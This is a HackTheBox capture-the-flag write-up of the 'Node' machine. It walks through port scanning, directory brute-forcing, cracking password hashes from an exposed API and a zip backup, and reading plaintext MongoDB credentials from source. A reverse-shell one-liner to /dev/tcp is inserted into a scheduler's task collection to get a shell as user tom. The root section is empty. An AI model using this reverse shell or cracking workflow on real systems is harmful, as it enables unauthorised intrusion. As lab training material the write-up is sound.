---
title: "[HTB] Machine: Node"
description: "[HTB] Machine: Node"
date: 2023-10-16
menu:
  sidebar:
    name: "[HTB] Machine: Node"
    identifier: htb-machine-Node
    parent: htb-machines-linux
    weight: 10
hero: images/node.png
tags: ["HTB"]
---

# Node
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p-  10.10.10.58 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 16:37 BST
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.11s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 27.72 seconds
```
```
└─$ nmap -Pn -p22,3000 -sC -sV  10.10.10.58 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-17 16:41 BST
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.12s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
|_http-title: MyPlace
| hadoop-tasktracker-info: 
|_  Logs: /login
| hadoop-datanode-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds

```

- Web Server
  - `nmap` showed `hadoop`
  - If we ran `nmap` without `-sC` option, it will show `NodeJS`

![](./images/1.png)

- `feroxbuster`
```
└─$ feroxbuster -u http://10.10.10.58:3000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x js,txt --depth 1 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.58:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [js, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       90l      249w     3861c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       15w      173c http://10.10.10.58:3000/uploads => http://10.10.10.58:3000/uploads/
301      GET        9l       15w      171c http://10.10.10.58:3000/assets => http://10.10.10.58:3000/assets/
301      GET        9l       15w      171c http://10.10.10.58:3000/vendor => http://10.10.10.58:3000/vendor
```
## Foothold
- If we check source files, we see `app.js` and other files with the routes

![](./images/2.png)

- I scanned all routes and found `/api/users/latest` endpoint with user hashes
  - And if we check `/api/users/` we have additional user, which is admin

![](./images/3.png)

![](./images/4.png)


- Let's try cracking hashes
```
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

![](./images/5.png)

```
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
```

- Now we can login as administrator account and download `backup`

![](./images/6.png)

- `myplace.backup`
```
└─$ file myplace.backup 
myplace.backup: ASCII text, with very long lines (65536), with no line terminators
```
```
└─$ cat myplace.backup                               
UEsDBAoAAAAAABqJEFUAAAAAAAAAAAAAAAAQABw...
```

- Looks like `base64`
```
└─$ cat myplace.backup | base64 -d > myplace.backup.decoded                                                 
```
```
└─$ file myplace.backup.decoded 
myplace.backup.decoded: Zip archive data, at least v1.0 to extract, compression method=store                         
```

- The archive is protected with password
```
└─$ mv myplace.backup.decoded myplace.zip   
```
```
└─$ unzip myplace.zip          
Archive:  myplace.zip
   creating: var/www/myplace/
[myplace.zip] var/www/myplace/package-lock.json password: 
   skipping: var/www/myplace/package-lock.json  incorrect password
...
```
- Let's crack it
```
└─$ zip2john myplace.zip > myplace.hash
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt myplace.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (myplace.zip)     
1g 0:00:00:00 DONE (2023-10-17 17:33) 33.33g/s 6144Kp/s 6144Kc/s 6144KC/s sandriux..joan21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

- Content
```
└─$ tree -L 2 .           
.
├── html
│   ├── assets
│   ├── favicon.ico
│   ├── files
│   ├── index.php
│   ├── logo.png
│   ├── news.php
│   └── Readme.txt
└── myplace
    ├── app.html
    ├── app.js
    ├── node_modules
    ├── package.json
    ├── package-lock.json
    └── static

7 directories, 9 files
```

- `app.js` contains password for `mark`
```
└─$ cat myplace/app.js                                 

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

...
```

- And we got a foothold

![](./images/7.png)

## User
- We have 2 processes ran by `tom`
```
...
root      1153     1  0 16:10 ?        00:00:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
tom       1231     1  1 16:10 ?        00:01:38 /usr/bin/node /var/www/myplace/app.js
mongodb   1233     1  0 16:10 ?        00:00:29 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1235     1  0 16:10 ?        00:00:01 /usr/bin/node /var/scheduler/app.js
root      1240     1  0 16:10 ?        00:00:00 /usr/sbin/sshd -D
...
```

- Content of `/var/scheduler/app.js`
  - It looks like it executes tasks from `tasks` collection
```
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

- Collection is empty
```
mark@node:/var$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> show collections
tasks
> db.tasks.find()
> 
```

- We can test it by creating a simple task
```
> db.tasks.insert({"cmd": "touch /tmp/test"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("652ebe1d90afb98861d029df"), "cmd" : "touch /tmp/test" }
> 
```

- After few seconds, the file is created
```
mark@node:/var$ ls /tmp/
mongodb-27017.sock  systemd-private-ee21381a291b4f8984a6c8ef6a4fb99b-systemd-timesyncd.service-yctj9M  test  vmware-root
```

- Let's get reverse shell
```
> db.tasks.find()
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.9/6666 0>&1'"})
WriteResult({ "nInserted" : 1 })
> 
```

![](./images/8.png)
## Root